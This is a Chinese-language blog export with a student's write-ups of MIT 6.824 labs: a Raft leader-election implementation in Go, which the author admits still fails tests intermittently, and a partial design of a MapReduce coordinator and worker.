    <content><![CDATA[<h2 id="lab-2a-leader-election"><a class="markdownIt-Anchor" href="#lab-2a-leader-election"></a> Lab-2A Leader Election</h2>
<p><img src="/2021/10/16/6-824-Lab2A/raft-2.png" alt></p>
<h3 id="lab-2a-leader-election-2"><a class="markdownIt-Anchor" href="#lab-2a-leader-election-2"></a> Lab-2A Leader election</h3>
<p>根据论文，任何服务器节点都处于三种状态之一：领导人、跟随者或者候选人。</p>
<p>Raft 把时间分割成任意长度的任期，任期使用连续的整数标记。每一段任期从一次选举开始，此时一个或多个候选人尝试成为领导者。如果一个候选人赢得选举，他就在接下来的任期内充当领导者的责任。在某些情况下，一次选举过程会造成选票的瓜分。在这种情况下，这一任期以没有领导人结束；一个新的任期（和一次新的选举）会很快重新开始。Raft 保证了在一个给定的任期内，最多只有一个领导者。</p>
<p><img src="/2021/10/16/6-824-Lab2A/raft-4.png" alt></p>
<p>Raft 采用心跳机制来触发领导人选举，当服务器程序启动时，他们都是跟随者身份。一个服务器节点继续保持着跟随者状态只要他从领导人或者候选者获取有效的 RPC。 领导人周期性向所有跟随者发送心跳包（即不包含日志项内容的附加日志项 RPCs）来维持自己的权威。如果一个跟随者在一定时间内没有接收到消息，他就会认为系统中没有可用的领导人，从而重新发起选举。</p>
<p>跟随者会通过增加自己的任期号，并向即群众其他服务器节点发送请求投票。当一个候选人从大多数服务器节点获得了针对同一个任期号的选票，那么他就赢得了这次选举并成为领导人，其中每个服务器只能投出一张选票，当服务器成为领导人后会立即向所有节点发送心跳包来维护自己的权威。</p>
<p>在等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加日志项 RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次 RPC 中的任期号比自己小，那么候选人就会拒绝这次的 RPC 并且继续保持候选人状态。</p>
<p>第三种可能的结果是候选人既没有赢得选举也没有输：如果有多个跟随者同时成为候选人，那么选票可能会被瓜分以至于没有候选人可以赢得大多数人的支持。当这种情况发生的时候，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举。然而，没有其他机制的话，选票可能会被无限的重复瓜分。</p>
<p>Raft 算法使用随机选举超时时间的方法来确保很少会发生选票瓜分的情况，就算发生也能很快的解决。为了阻止选票起初就被瓜分，选举超时时间是从一个固定的区间（例如 150-300 毫秒）随机选择。这样可以把服务器都分散开以至于在大多数情况下只有一个服务器会选举超时；然后他赢得选举并在其他服务器超时之前发送心跳包。同样的机制被用在选票瓜分的情况下。每一个候选人在开始一次选举的时候会重置一个随机的选举超时时间，然后在超时时间内等待投票的结果；这样减少了在新的选举中另外的选票瓜分的可能性。</p>
<p><strong>实现思路：</strong></p>
<p>首先，在所有服务器启动时会异步启动一个 goroutine 来随机计时，当计时时间到了的时候跟随者会成为候选人并向其他服务器节点发送选票，这里我们需要遍历所有除自己的服务器节点，并为每个节点启动一个 goroutine 发送选票。当等待所有选票回复后则查看自己选票数，倘若赢得大多数选票则自动成为领导人并向其他节点发送心跳包，否则自动成为追随者并设置任期时长。</p>
<p>在 <code>ticker</code> 中，我们需要设定随机的休眠时间，在休眠过后判断最近是否接收到心跳包，如果未接收到则表明选举超时，此时需要去向其他服务器节点周期性地发送选举请求，直到发生以下情况：</p>
<ul>
<li>自己成为了leader</li>
<li>收到其他节点发送来的心跳包</li>
<li>该任期内无 leader，变成候选人重新开启选举</li>
</ul>
<p>同时，我们也需要异步检查自己的状态是否是 leader 并向其他节点周期性地发送心跳包</p>
<p>Raft 的结构定义由论文的 Figure2 定义如下：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Raft <span class="keyword">struct</span> &#123;</span><br><span class="line">	mu        sync.Mutex          <span class="comment">// Lock to protect shared access to this peer&#x27;s state</span></span><br><span class="line">	peers     []*labrpc.ClientEnd <span class="comment">// RPC end points of all peers</span></span><br><span class="line">	persister *Persister          <span class="comment">// Object to hold this peer&#x27;s persisted state</span></span><br><span class="line">	me        <span class="keyword">int</span>                 <span class="comment">// this peer&#x27;s index into peers[]</span></span><br><span class="line">	dead      <span class="keyword">int32</span>               <span class="comment">// set by Kill()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Your data here (2A, 2B, 2C).</span></span><br><span class="line">	<span class="comment">// Look at the paper&#x27;s Figure 2 for a description of what</span></span><br><span class="line">	<span class="comment">// state a Raft server must maintain.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 状态参数</span></span><br><span class="line">	<span class="comment">// 服务器已知最新任期（在服务器首次启动的时候初始化为0，单调递增）</span></span><br><span class="line">	CurrentTerm <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 当前任期内收到选票的候选人id，如果没有投给人和候选者，则为空</span></span><br><span class="line">	VotedFor <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 日志条目，每个条目包含了用于状态机的命令，以及领导者接收到该条目时的任期（第一个索引为1）</span></span><br><span class="line">	Log []LogEntry</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 服务器上的易失性状态</span></span><br><span class="line">	<span class="comment">// 已知已提交的最高的日志条目的索引（初始值为0，单调递增）</span></span><br><span class="line">	CommitIndex <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 已经被应用到状态机的最高的日至条目的索引（初始值为0，单调递增）</span></span><br><span class="line">	LastApplied <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 领导者（服务器）上的易失性状态（选举后已经重新初始化）</span></span><br><span class="line">	<span class="comment">// 对于每一台服务器，发送到该服务器的下一个日志条目的索引（初始值为领导者最后的日志条目的索引 + 1）</span></span><br><span class="line">	NextIndex []<span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 对于每一台服务器，已知的已经复制到该服务器的最高日志条目的索引（初始值为0，单调递增）</span></span><br><span class="line">	MatchIndex []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 记录此台服务器的状态</span></span><br><span class="line">	State <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 记录此台服务器上次接收心跳检测的时间</span></span><br><span class="line">	HeartBeat time.Time</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ticker</code> 的实现如下所示:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The ticker go routine starts a new election if this peer hasn&#x27;t received</span></span><br><span class="line"><span class="comment">// heartsbeats recently.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">ticker</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> !rf.killed() &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Your code here to check if a leader election should</span></span><br><span class="line">		<span class="comment">// be started and to randomize sleeping time using</span></span><br><span class="line">		<span class="comment">// time.Sleep().</span></span><br><span class="line"></span><br><span class="line">		electionTimeout := rf.getelectionTimeout()</span><br><span class="line">		time.Sleep(electionTimeout)</span><br><span class="line"></span><br><span class="line">		duration := time.Since(rf.getHeartBeatTime())</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果超过选举超时时间没有接收到心跳包，则变成候选者发起选举</span></span><br><span class="line">		<span class="keyword">if</span> duration &gt; electionTimeout &#123;</span><br><span class="line">			DPrintf(<span class="string">&quot;[Debug] Server%v选举超时\n&quot;</span>, rf.me)</span><br><span class="line">			DPrintf(<span class="string">&quot;[Debug] electionTimeout: %v duration: %v\n&quot;</span>, electionTimeout, duration)</span><br><span class="line">			rf.election()</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> rf.State != Leader &#123;</span><br><span class="line">			<span class="comment">// 如果接到了心跳包则变成追随者</span></span><br><span class="line">			DPrintf(<span class="string">&quot;[Debug] Server%v为Follower.\n&quot;</span>, rf.me)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			DPrintf(<span class="string">&quot;[Debug] Server%v仍为Leader.\n&quot;</span>, rf.me)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ticker()</code> 首先获取随机的选举超时时间，随后进入休眠，当选举超时时获取最近的一次获取心跳检测的时间，并来判断在选举超时时间内有没有接收到心跳包，若没有则转换为候选人并开始一次选举<code>election()</code>:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 候选人发起选举</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">election</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 发起选举，首先增加自己的任期</span></span><br><span class="line">	DPrintf(<span class="string">&quot;[election] 开始选举.\n&quot;</span>)</span><br><span class="line">	DPrintf(<span class="string">&quot;[election] 更新任期.\n&quot;</span>)</span><br><span class="line">	rf.ConvertTo(Candidates)</span><br><span class="line">	<span class="comment">// rf.CurrentTerm += 1</span></span><br><span class="line">	<span class="comment">// 并行地向除自己的服务器索要选票</span></span><br><span class="line">	<span class="comment">// 如果没有收到选票，它会反复尝试，直到发生以下三种情况之一：</span></span><br><span class="line">	<span class="comment">// 1. 获得超过半数的选票；成为 Leader，并向其他节点发送 AppendEntries 心跳;</span></span><br><span class="line">	<span class="comment">// 2. 收到来自 Leader 的 RPC， 转为 Follwer</span></span><br><span class="line">	<span class="comment">// 3. 其他两种情况都没发生，没人能够获胜（electionTimeout 已过）：增加 currentTerm,</span></span><br><span class="line">	<span class="comment">// 开始新一轮选举</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> !rf.killed() &#123;</span><br><span class="line">			wg := <span class="built_in">new</span>(sync.WaitGroup)</span><br><span class="line">			<span class="comment">// wg.Add(len(rf.peers))</span></span><br><span class="line">			<span class="comment">// 如果当前节点没有宕机并且仍为候选人时周期性地向所有节点发送投票请求</span></span><br><span class="line">			nVote := <span class="number">1</span></span><br><span class="line">			<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(rf.peers); i++ &#123;</span><br><span class="line">				<span class="keyword">if</span> i != rf.me &#123;</span><br><span class="line">					wg.Add(<span class="number">1</span>)</span><br><span class="line">					<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(server <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">						rf.mu.Lock()</span><br><span class="line">						req := RequestVoteArgs&#123;&#125;</span><br><span class="line">						reply := RequestVoteReply&#123;&#125;</span><br><span class="line">						<span class="comment">// 初始化请求的参数</span></span><br><span class="line">						req.Term = rf.CurrentTerm</span><br><span class="line">						req.CandidateId = rf.me</span><br><span class="line">						rf.mu.Unlock()</span><br><span class="line">						<span class="keyword">if</span> rf.sendRequestVote(server, wg, &amp;req, &amp;reply) &#123;</span><br><span class="line">							rf.mu.Lock()</span><br><span class="line">							<span class="keyword">defer</span> rf.mu.Unlock()</span><br><span class="line">							<span class="keyword">if</span> rf.CurrentTerm != req.Term &#123;</span><br><span class="line">								<span class="keyword">return</span></span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span> reply.Term &gt; rf.CurrentTerm &#123;</span><br><span class="line">								rf.CurrentTerm = reply.Term</span><br><span class="line">								rf.ConvertTo(Follower)</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span> reply.VoteGranted &#123;</span><br><span class="line">								DPrintf(<span class="string">&quot;[sendRequestVote] Server%v承认%v\n&quot;</span>, server, rf.me)</span><br><span class="line">								nVote += <span class="number">1</span></span><br><span class="line">								<span class="keyword">if</span> nVote &gt; <span class="built_in">len</span>(rf.peers)/<span class="number">2</span> &amp;&amp; rf.State == Candidates &#123;</span><br><span class="line">									<span class="comment">// 获得超过半数的选票，成为 Leader</span></span><br><span class="line">									rf.ConvertTo(Leader)</span><br><span class="line">									DPrintf(<span class="string">&quot;[Debug] Server%v得到超过半数选票，成为Leader\n&quot;</span>, rf.me)</span><br><span class="line">									<span class="keyword">return</span></span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span> rf.CurrentTerm &lt; reply.Term &#123;</span><br><span class="line">								rf.ConvertTo(Follower)</span><br><span class="line">								rf.CurrentTerm = reply.Term</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;(i)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			wg.Wait()</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 休息一段时间再向服务器节点发送投票请求</span></span><br><span class="line">		duration := time.Millisecond * <span class="number">100</span></span><br><span class="line">		time.Sleep(duration)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>election()</code> 函数中，他会周期性地并发地向所有节点发送选举请求，只有当以下情况发生时结束选举：</p>
<ul>
<li>获得超过半数选票，成为 Leader</li>
<li>收到其他 Leader 发来的心跳检测包，成为 Follower</li>
<li>该任期内没有节点成为 Leader，选举超时进入下一个任期</li>
</ul>
<p>其中，接收到选票的节点需要根据选票的信息来为候选人投票，只有候选人的任期大于自己的任期并且当前节点没有为任何节点投票或者为该节点投过票时才为其投票:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">RequestVote</span><span class="params">(args *RequestVoteArgs, reply *RequestVoteReply)</span></span> &#123;</span><br><span class="line">	rf.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> rf.mu.Unlock()</span><br><span class="line">	<span class="comment">// 如果term &lt; currentTerm返回 false</span></span><br><span class="line">	<span class="keyword">if</span> args.Term &gt; rf.CurrentTerm &#123;</span><br><span class="line">		rf.ConvertTo(Follower)</span><br><span class="line">		rf.CurrentTerm = args.Term</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (args.Term &lt; rf.CurrentTerm) || (rf.VotedFor != <span class="number">-1</span> &amp;&amp; rf.VotedFor != args.CandidateId) &#123;</span><br><span class="line">		reply.Term = rf.CurrentTerm</span><br><span class="line">		reply.VoteGranted = <span class="literal">false</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果 votedFor 为空或者为 candidateId，</span></span><br><span class="line">	<span class="comment">// 并且候选人的日志至少和自己一样新，那么就投票给他</span></span><br><span class="line">	<span class="keyword">if</span> rf.VotedFor == <span class="number">-1</span> || rf.VotedFor == args.CandidateId &#123;</span><br><span class="line">		DPrintf(<span class="string">&quot;[RequestVote] Server%v为候选人%v投票.\n&quot;</span>, rf.me, args.CandidateId)</span><br><span class="line">		<span class="comment">// 此时要重新设置选举，即模拟心跳包</span></span><br><span class="line">		rf.HeartBeat = time.Now()</span><br><span class="line">		rf.VotedFor = args.CandidateId</span><br><span class="line">		reply.VoteGranted = <span class="literal">true</span></span><br><span class="line">		reply.Term = rf.CurrentTerm</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当候选人选举成功成为 <code>Leader</code> 的时候，他会周期性地向所有节点（包括自己）发送心跳检测包来维护自己的权威，发送心跳检测的方法定义如下:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Leader 需要向 flowers 周期性地发送心跳包</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">sendHeartBeats</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> !rf.killed() &amp;&amp; rf.State == Leader &#123;</span><br><span class="line">			wg := <span class="built_in">new</span>(sync.WaitGroup)</span><br><span class="line">			<span class="comment">// 如果节点的状态为领导者并且节点没有宕机，则周期性地向每个节点发送心跳包</span></span><br><span class="line">			<span class="keyword">for</span> index := <span class="number">0</span>; index &lt; <span class="built_in">len</span>(rf.peers); index++ &#123;</span><br><span class="line">				wg.Add(<span class="number">1</span>)</span><br><span class="line">				<span class="keyword">go</span> rf.sendAppendEntries(index, wg)</span><br><span class="line">			&#125;</span><br><span class="line">			DPrintf(<span class="string">&quot;[sendHeartBeats] 等待.\n&quot;</span>)</span><br><span class="line">			wg.Wait()</span><br><span class="line">			time.Sleep(<span class="number">50</span> * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，当节点接收到心跳检测包的时候也需要根据自己的状态返回响应并更新自己接收到心跳的时间:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Leader 向 Follower 发送心跳包</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">RequestAppendEntries</span><span class="params">(args *AppendEntries, reply *AppendEntriesReply)</span></span> &#123;</span><br><span class="line">	rf.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> rf.mu.Unlock()</span><br><span class="line">	DPrintf(<span class="string">&quot;[Debug] Server%v收到Leader%v发送来的心跳包\n&quot;</span>, rf.me, args.LeaderID)</span><br><span class="line">	<span class="keyword">if</span> args.Term &lt; rf.CurrentTerm &#123;</span><br><span class="line">		<span class="comment">// 如果领导者的任期小于接收者的当前任期，返回假</span></span><br><span class="line">		reply.Success = <span class="literal">false</span></span><br><span class="line">		reply.Term = rf.CurrentTerm</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	rf.HeartBeat = time.Now()</span><br><span class="line">	<span class="keyword">if</span> args.Term &gt; rf.CurrentTerm || rf.State != Follower &#123;</span><br><span class="line">		rf.ConvertTo(Follower)</span><br><span class="line">		rf.CurrentTerm = args.Term</span><br><span class="line">	&#125;</span><br><span class="line">	reply.Success = <span class="literal">true</span></span><br><span class="line">	reply.Term = rf.CurrentTerm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，若 Leader 发现自己的任期小于相应的任期将会立即变成 Follower 等待选举超时。</p>
<p>我们定义了 <code>ConvertTo()</code> 函数来封装每次状态转换的细节:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">ConvertTo</span><span class="params">(state <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> state &#123;</span><br><span class="line">	<span class="keyword">case</span> Follower:</span><br><span class="line">		rf.State = Follower</span><br><span class="line">		rf.VotedFor = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">case</span> Candidates:</span><br><span class="line">		rf.State = Candidates</span><br><span class="line">		rf.CurrentTerm += <span class="number">1</span></span><br><span class="line">		rf.VotedFor = rf.me</span><br><span class="line">	<span class="keyword">case</span> Leader:</span><br><span class="line">		rf.State = Leader</span><br><span class="line">		rf.HeartBeat = time.Now()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，Follower 需要清空自己的 <code>VotedFor</code> 为了准备下一个任期的选举投票，同时 Leader 也需要更新自己的心跳检测避免再次选举超时</p>
<p>尽管我们最终写出了一个可运行的领导选举过程，但是在最终的测试时仍然不稳定，经常会有失败的情况。并且我也不知道怎么解决（感觉都是照着论文实现的），而且感觉失败的时候都是感觉测试的时候再给一点时间就会 success(不知道是不是我的错觉)，在之后我会继续优化这个过程达到更稳定的效果。</p>
<p><strong>通过的测试用例</strong></p>
<ul>
<li>[x] TestInitialElection2</li>
<li>[x] TestReElection2A</li>
<li>[x] TestManyElections2A</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>6.824</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>6.824 MapReduce</title>
    <url>/2021/10/16/6-824-MapReduce/</url>
    <content><![CDATA[<h2 id="lab-1-mapreduce"><a class="markdownIt-Anchor" href="#lab-1-mapreduce"></a> Lab-1 MapReduce</h2>
<p>之前的版本是用 goroutine 写的，写错了，重新梳理一下想法：</p>
<p>首先，Master 启动并初始化状态，然后等待 Worker 来请求，此时的 Master 并不知道有多少台 Worker 工作，因此他会维护一个 WorkerState 的数组，此时这个数组为空，当 Worker 来连接 Master 的时候，Master 在数组里为其加入状态，并为其添加 ID 号，并将其作为结果返回 Worker，此时 Worker 就知道自己的 ID 号了，在之后的请求中 Worker 将会带着这个 ID 号以便 Master 维护 Worker 的状态。</p>
<p>当 Worker 每次向 Master 请求并拿到 task 的时候，Worker 将会开启一个定时器来记录工作时间是否超时，倘若超时的话则说明 Worker 已经崩溃了，此时则将当前 Worker 运行的任务标记为 Idle， 当其他 Worker 请求的时候发送给其他 Worker。计时器计划采用 goroutine 来实现，为每一个 Worker 维护一个计时器，使用 channel 来发送消息，表示 Worker 是否超时，倘若超时则采取对应的策略。当所有 Map 任务都完成而此时 Reduce 数据还未处理完的时候则向对应的 Worker 发送 Wait 状态使 Worker 过一段时间再来请求。</p>
<p>Master 需要处理 Map 产生的中间文件并将其分到对应的 Bucket 中，这里打算使用 goroutine 来异步处理，当 Reduce 被分到对应的 Bucket 的时候，goroutine 向 Master 发送消息，此时当有 Worker 来请求任务时则向其派发 Reduce 任务。</p>
<p>当仍然有 Reduce 未完成时，此时当 Worker 来请求不能直接向 Worker 响应 Exit，因为有可能其他 Worker 宕机的情况，此时应当返回 Wait 使 Worker 处于等待状态，那么如果有 Worker 宕机了，Master 则将记录的 Worker 运行的任务发送给来请求的 Worker 重新运行。</p>
<p>一些数据结构的定义：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传输 Map 任务的结构体定义，MapID 记录的是第几个 Map 任务，</span></span><br><span class="line"><span class="comment">// 用来构建中间文件名，Filename 则用来传输 Map 的文件名</span></span><br><span class="line"><span class="keyword">type</span> MapTask <span class="keyword">struct</span> &#123;</span><br><span class="line">	MapID    <span class="keyword">int</span></span><br><span class="line">	FileName <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传输 Reduce 的结构体定义，ReduceID 记录第几个 Reduce 任务将要执行，</span></span><br><span class="line"><span class="comment">// Bucket 是 ReduceBucket, 维护了 key -&gt; values 的映射</span></span><br><span class="line"><span class="keyword">type</span> ReduceTask <span class="keyword">struct</span> &#123;</span><br><span class="line">	ReduceID <span class="keyword">int</span></span><br><span class="line">	Bucket   ReduceBucket</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Master 维护 Worker 状态，每次 Worker 向 Master 发出请求，</span></span><br><span class="line"><span class="comment">// Master 都会更新自己维护的 Worker 的状态</span></span><br><span class="line"><span class="keyword">type</span> WorkersState <span class="keyword">struct</span> &#123;</span><br><span class="line">	WID     <span class="keyword">int</span></span><br><span class="line">	WStatus <span class="keyword">int</span></span><br><span class="line">	MTask   MapTask</span><br><span class="line">	RTask   ReduceTask</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于 Master 与 Worker 互相通信的结构体定义如下所示：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Worker 向 Master 请求任务，此时需要携带 WID 用来向</span></span><br><span class="line"><span class="comment">// Master 表明自己的身份，第一次请求携带 -1，表明自己是一台</span></span><br><span class="line"><span class="comment">// 没有与主机通信的及其，此时主机将会为其分配 WID 并将其作为响应返回</span></span><br><span class="line"><span class="keyword">type</span> TaskRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	WID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Master 对 Worker 请求的响应，包含分配的 WID，任务状态，</span></span><br><span class="line"><span class="comment">// Map 或者 Reduce 任务的定义</span></span><br><span class="line"><span class="keyword">type</span> TaskResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">	WID        <span class="keyword">int</span></span><br><span class="line">	TaskStatus <span class="keyword">int</span></span><br><span class="line">	MapTask    MapTask</span><br><span class="line">	ReduceTask ReduceTask</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Master 所维护的状态：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Coordinator <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Your definitions here.</span></span><br><span class="line">	nMap    <span class="keyword">int</span></span><br><span class="line">	nReduce <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 用来维护每个任务的状态，用来派发任务</span></span><br><span class="line">	MapStateLock sync.RWMutex</span><br><span class="line">	MapState     []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">	ReduceStateLock sync.RWMutex</span><br><span class="line">	ReduceState     []<span class="keyword">int</span></span><br><span class="line">	<span class="comment">// 输入的文件名</span></span><br><span class="line">	Files []<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// reduce buckets，用来派发 reduce tasks</span></span><br><span class="line">	Buckets []ReduceBucket</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 每个 Worker 的状态维护列表</span></span><br><span class="line">	WStates    []WorkersState</span><br><span class="line">	WorkerLock sync.RWMutex</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对于每个 Worker 维护的计时器channel</span></span><br><span class="line">	TimerChans []<span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce数据是否已经准备好</span></span><br><span class="line">	IsReduceReady atomic.Value</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 所有任务是否已经完成</span></span><br><span class="line">	TaskEnd atomic.Value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Worker 所维护的状态:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> WorkerManager <span class="keyword">struct</span> &#123;</span><br><span class="line">	WID     <span class="keyword">int</span></span><br><span class="line">	MapF    <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span> []<span class="title">KeyValue</span></span></span><br><span class="line">	ReduceF <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, []<span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于 Worker 中的行为较为简单，只需在每次任务完成后向 Master 发送 RPC 请求即可：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Worker</span><span class="params">(mapf <span class="keyword">func</span>(<span class="keyword">string</span>, <span class="keyword">string</span>)</span> []<span class="title">KeyValue</span>,</span></span><br><span class="line">	reducef <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, []<span class="keyword">string</span>)</span> <span class="title">string</span>)</span> &#123;</span><br><span class="line">	<span class="comment">// 初始化管理者</span></span><br><span class="line">	<span class="keyword">var</span> manager WorkerManager</span><br><span class="line">	manager.WID = <span class="number">-1</span></span><br><span class="line">	manager.MapF = mapf</span><br><span class="line">	manager.ReduceF = reducef</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		req := TaskRequest&#123;</span><br><span class="line">			WID: manager.WID,</span><br><span class="line">		&#125;</span><br><span class="line">		rsp := TaskResponse&#123;&#125;</span><br><span class="line">		call(<span class="string">&quot;Coordinator.RequestTask&quot;</span>, &amp;req, &amp;rsp)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 更新管理者ID</span></span><br><span class="line">		<span class="keyword">if</span> manager.WID == <span class="number">-1</span> &#123;</span><br><span class="line">			manager.WID = rsp.WID</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> rsp.TaskStatus &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> Wait:</span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Wait] Worker %v wait.\n&quot;</span>, manager.WID)</span><br><span class="line">			time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">		<span class="keyword">case</span> RunMapTask:</span><br><span class="line">			<span class="comment">// Run Map Task</span></span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Map Task] Worker %v run map task %v.\n&quot;</span>, manager.WID, rsp.MapTask.MapID)</span><br><span class="line">			RunMapJob(rsp.MapTask, manager.MapF)</span><br><span class="line">		<span class="keyword">case</span> RunReduceTask:</span><br><span class="line">			<span class="comment">// Run Reduce Task</span></span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Map Task] Worker %v run reduce task %v.\n&quot;</span>, manager.WID, rsp.ReduceTask.ReduceID)</span><br><span class="line">			RunReduceJob(rsp.ReduceTask, manager.ReduceF)</span><br><span class="line">		<span class="keyword">case</span> Exit:</span><br><span class="line">			<span class="comment">// Call Master to finish</span></span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Exit] Worker %v exit.\n&quot;</span>, manager.WID)</span><br><span class="line">			RunExitJob()</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于 Master 的核心处理逻辑则较为复杂，因为它需要调度 Worker 去运行不同的任务，并判断是否有 Worker 宕机了。</p>
